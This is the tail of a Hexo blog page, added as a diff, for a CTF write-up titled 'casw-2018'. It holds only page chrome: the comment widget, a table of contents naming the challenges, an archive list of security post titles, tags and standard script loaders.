+            </p><p>原文链接: <a href="https://www.tiandiwuji.top/posts/42373/">https://www.tiandiwuji.top/posts/42373/</a>
+            </p><p>发表日期: <a href="https://www.tiandiwuji.top/posts/42373/">September 18th 2018, 8:44:02 am</a>
+            </p><p>版权声明: 本文采用<a rel="external nofollow" href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href="/posts/11234/" title="dubbo-启动">
+                    <div class="nextTitle">dubbo-启动</div>
+                </a>
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href="/posts/32469/" title="noxctf-writeup">
+                    <div class="prevTitle">noxctf-writeup</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+    <div id="lv-container" data-id="city" data-uid="MTAyMC8zODcyNS8xNTI1Mw==">
+        <script type="text/javascript">
+            (function (d, s) {
+                var j, e = d.getElementsByTagName(s)[0];
+                if (typeof LivereTower === 'function') { return; }
+                j = d.createElement(s);
+                j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+                j.async = true;
+
+                e.parentNode.insertBefore(j, e);
+            })(document, 'script');
+        </script>
+        <noscript>为正常使用来必力评论功能请激活JavaScript</noscript>
+    </div>
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!--PC和WAP自适应版-->
+
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:fengyunhetao@gmail.com" class="iconfont-archer email" title="email" rel="external nofollow" target="_blank"></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/fengyuhetao" class="iconfont-archer github" target="_blank" title="github"></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank" rel="external nofollow">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank" rel="external nofollow">Archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+    
+     
+    <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+    
+    </div>
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style="top:50vh;">
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Web"><span class="toc-number">1.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ldab"><span class="toc-number">1.1.</span> <span class="toc-text">ldab</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSO"><span class="toc-number">1.2.</span> <span class="toc-text">SSO</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Hacker-Movies-Club"><span class="toc-number">1.3.</span> <span class="toc-text">Hacker Movies Club</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PWN"><span class="toc-number">2.</span> <span class="toc-text">PWN</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#bigboy"><span class="toc-number">2.1.</span> <span class="toc-text">bigboy</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#get-it"><span class="toc-number">2.2.</span> <span class="toc-text">get it</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#shellcode"><span class="toc-number">2.3.</span> <span class="toc-text">shellcode</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#solve1"><span class="toc-number">2.3.1.</span> <span class="toc-text">solve1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#solve2"><span class="toc-number">2.3.2.</span> <span class="toc-text">solve2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#solve3"><span class="toc-number">2.3.3.</span> <span class="toc-text">solve3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#solve4"><span class="toc-number">2.3.4.</span> <span class="toc-text">solve4</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#solve5"><span class="toc-number">2.3.5.</span> <span class="toc-text">solve5</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#doubleTroubble"><span class="toc-number">2.4.</span> <span class="toc-text">doubleTroubble</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#REVERSEs"><span class="toc-number">3.</span> <span class="toc-text">REVERSEs</span></a></li></ol>
+    </div>
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 51
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> 2018 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/21</span><a class="archive-post-title" href="/posts/37116/">偏门汇编指令大全</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/21</span><a class="archive-post-title" href="/posts/1345/">pwnable.kr_刷刷刷</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/20</span><a class="archive-post-title" href="/posts/62824/">dubbo项目结构</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/20</span><a class="archive-post-title" href="/posts/28842/">zookeeper安装-启动</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/20</span><a class="archive-post-title" href="/posts/11234/">dubbo-启动</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/18</span><a class="archive-post-title" href="/posts/42373/">casw-2018</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/08</span><a class="archive-post-title" href="/posts/32469/">noxctf-writeup</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/05</span><a class="archive-post-title" href="/posts/18428/">lamp && lnmp以apt-get的方式安装</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/04</span><a class="archive-post-title" href="/posts/7418/">websec.fr-writeup</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/02</span><a class="archive-post-title" href="/posts/42614/">TokyoWesterns CTF</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/21</span><a class="archive-post-title" href="/posts/12920/">[Untitled Post]</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/06</span><a class="archive-post-title" href="/posts/41139/">how2heap-分析总结（一）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/06</span><a class="archive-post-title" href="/posts/27029/">0ctf2018-babyheap</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/03</span><a class="archive-post-title" href="/posts/39475/">ctfzone-ctf</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/30</span><a class="archive-post-title" href="/posts/13474/">real-world-ctf</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/30</span><a class="archive-post-title" href="/posts/6549/">ISITDTU-CTF</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/23</span><a class="archive-post-title" href="/posts/46785/">巅峰极客ctf</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/18</span><a class="archive-post-title" href="/posts/5109/">php-命令执行</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/17</span><a class="archive-post-title" href="/posts/62555/">RSA学习</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/17</span><a class="archive-post-title" href="/posts/28940/">ssti</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/15</span><a class="archive-post-title" href="/posts/45992/">php命令执行函数</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/09</span><a class="archive-post-title" href="/posts/63527/">ollyice</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/30</span><a class="archive-post-title" href="/posts/16486/">web安全备忘录</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/30</span><a class="archive-post-title" href="/posts/29914/">ssrf+gopher</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/26</span><a class="archive-post-title" href="/posts/22546/">googlectf2018</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/24</span><a class="archive-post-title" href="/posts/9490/">proc的作用</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/21</span><a class="archive-post-title" href="/posts/32268/">sctf2018</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/14</span><a class="archive-post-title" href="/posts/54865/">python多线程和lock和Rlock</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/08</span><a class="archive-post-title" href="/posts/54897/">linux格式化字符串漏洞</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/08</span><a class="archive-post-title" href="/posts/29112/">pwn前置知识</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/08</span><a class="archive-post-title" href="/posts/5359/">sqlmap使用</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/04</span><a class="archive-post-title" href="/posts/50844/">linux命令执行</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/04</span><a class="archive-post-title" href="/posts/51203/">LRE_PAYLOAD绕过open_basedir</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/29</span><a class="archive-post-title" href="/posts/17498/">mysql忘记密码/修改密码</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/29</span><a class="archive-post-title" href="/posts/62889/">docker使用手册</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/29</span><a class="archive-post-title" href="/posts/56136/">普通用户免密码切换到root</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/28</span><a class="archive-post-title" href="/posts/26365/">suctf2018</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/22</span><a class="archive-post-title" href="/posts/23527/">phpinfo解读</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/22</span><a class="archive-post-title" href="/posts/9764/">rctf2018学习笔记</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/21</span><a class="archive-post-title" href="/posts/32791/">bypassaslr_1</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/09</span><a class="archive-post-title" href="/posts/53269/">pwn备忘录</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/08</span><a class="archive-post-title" href="/posts/62655/">cbc翻转</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/07</span><a class="archive-post-title" href="/posts/60875/">misc思路</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/24</span><a class="archive-post-title" href="/posts/33488/">简单的命令（shell+python）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/24</span><a class="archive-post-title" href="/posts/15636/">parse_url + curl</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/20</span><a class="archive-post-title" href="/posts/22230/">ddctf2018</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/18</span><a class="archive-post-title" href="/posts/65402/">PHP代码审计归纳</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/27</span><a class="archive-post-title" href="/posts/52452/">xss</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/27</span><a class="archive-post-title" href="/posts/24854/">url相对路径和绝对路径</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/26</span><a class="archive-post-title" href="/posts/40688/">python3和python2 base64的问题</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/21</span><a class="archive-post-title" href="/posts/41083/">sql注入大全</a>
+        </li>
+    
+    </ul></div>
+  </div>
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+    
+        <span class="sidebar-tag-name" data-tags="ctf"><span class="iconfont-archer">&#xe606;</span>ctf</span>
+    
+        <span class="sidebar-tag-name" data-tags="web安全"><span class="iconfont-archer">&#xe606;</span>web安全</span>
+    
+        <span class="sidebar-tag-name" data-tags="pwn"><span class="iconfont-archer">&#xe606;</span>pwn</span>
+    
+        <span class="sidebar-tag-name" data-tags="dubbo"><span class="iconfont-archer">&#xe606;</span>dubbo</span>
+    
+        <span class="sidebar-tag-name" data-tags="工具手册"><span class="iconfont-archer">&#xe606;</span>工具手册</span>
+    
+        <span class="sidebar-tag-name" data-tags="运维"><span class="iconfont-archer">&#xe606;</span>运维</span>
+    
+        <span class="sidebar-tag-name" data-tags="mysql"><span class="iconfont-archer">&#xe606;</span>mysql</span>
+    
+        <span class="sidebar-tag-name" data-tags="python"><span class="iconfont-archer">&#xe606;</span>python</span>
+    
+        <span class="sidebar-tag-name" data-tags="python安全"><span class="iconfont-archer">&#xe606;</span>python安全</span>
+    
+        <span class="sidebar-tag-name" data-tags="前端"><span class="iconfont-archer">&#xe606;</span>前端</span>
+    
+        <span class="sidebar-tag-name" data-tags="zookeeper"><span class="iconfont-archer">&#xe606;</span>zookeeper</span>
+    
+        <span class="sidebar-tag-name" data-tags="linux"><span class="iconfont-archer">&#xe606;</span>linux</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+    缺失模块。<br>
+    1、请确保node版本大于6.2<br>
+    2、在博客根目录（注意不是archer根目录）执行以下命令：<br>
+    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br>
+    3、在根目录_config.yml里添加配置：
+    <pre style="color: #787878; font-size: 0.6rem;">
+jsonContent:
+  meta: false
+  pages: false
+  posts:
+    title: true
+    date: true
+    path: true
+    text: false
+    raw: false
+    content: false
+    slug: false
+    updated: false
+    comments: false
+    link: false
+    permalink: false
+    excerpt: false
+    categories: true
+    tags: true</pre>
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+        <span class="sidebar-category-name" data-categories="安全"><span class="iconfont-archer">&#xe60a;</span>安全</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+    </div>
+</div> 
+    <script>
+    var siteMeta = {
+        root: "/",
+        author: "Tianji"
+    }
+</script>
+    <!-- CDN failover -->
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ === 'undefined')
+        {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js">\x3C/script>')
+        }
+    </script>
+    <script src="/scripts/main.js"></script>
+    <!-- algolia -->
+    
+    <!-- busuanzi  -->
+    
+    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+    <!-- CNZZ  -->
+    
+    
+    <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
+     
+    </body>
+</html>
+
+
